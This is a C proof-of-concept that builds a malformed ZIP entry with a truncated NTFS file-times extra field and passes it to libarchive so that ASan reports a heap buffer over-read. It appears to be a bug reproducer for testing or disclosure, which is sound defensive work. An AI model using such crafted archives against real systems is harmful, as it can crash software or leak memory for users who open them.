/*
 * PoC: ZIP entry whose local file header carries an NTFS (0x000a) extra
 * field with a tag-0x0001 attribute that declares 24 bytes of FILETIME
 * data, but the attribute data is truncated by the end of the stream.
 * Reading the FILETIMEs runs past the end of the input buffer.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void
put_le16(unsigned char *p, unsigned v)
{
	p[0] = (unsigned char)(v & 0xff);
	p[1] = (unsigned char)((v >> 8) & 0xff);
}

static void
put_le32(unsigned char *p, unsigned v)
{
	p[0] = (unsigned char)(v & 0xff);
	p[1] = (unsigned char)((v >> 8) & 0xff);
	p[2] = (unsigned char)((v >> 16) & 0xff);
	p[3] = (unsigned char)((v >> 24) & 0xff);
}

int
main(void)
{
	unsigned char data[30 + 1 + 12];
	unsigned char *zip;
	struct archive *a;
	struct archive_entry *e;
	int r;

	/* Local file header for a stored, empty file "a". */
	memset(data, 0, sizeof(data));
	memcpy(data, "PK\003\004", 4);
	put_le16(data + 4, 20);		/* version needed */
	put_le16(data + 6, 0);		/* general purpose flags */
	put_le16(data + 8, 0);		/* compression: stored */
	put_le32(data + 14, 0);		/* crc32 */
	put_le32(data + 18, 0);		/* compressed size */
	put_le32(data + 22, 0);		/* uncompressed size */
	put_le16(data + 26, 1);		/* filename length */
	put_le16(data + 28, 12);	/* extra field length */
	data[30] = 'a';		/* filename */

	/* NTFS extra field: reserved(4) + attribute header(4). */
	put_le16(data + 31, 0x000a);	/* extra field id */
	put_le16(data + 33, 8);		/* extra field data size */
	put_le16(data + 39, 0x0001);	/* attribute tag: file times */
	put_le16(data + 41, 24);	/* claimed attribute data size */

	/* Exact-size heap block so the over-read is detected by ASan. */
	zip = malloc(sizeof(data));
	if (zip == NULL)
		return (1);
	memcpy(zip, data, sizeof(data));

	a = archive_read_new();
	if (a == NULL) {
		free(zip);
		return (1);
	}
	archive_read_support_format_zip(a);
	if (archive_read_open_memory(a, zip, sizeof(data)) != ARCHIVE_OK) {
		fprintf(stderr, "open_memory: %s\n", archive_error_string(a));
		archive_read_free(a);
		free(zip);
		return (1);
	}

	r = archive_read_next_header(a, &e);
	printf("next_header=%d name=%s\n", r,
	    r == ARCHIVE_OK ? archive_entry_pathname(e) : "-");

	archive_read_free(a);
	free(zip);
	return (0);
}
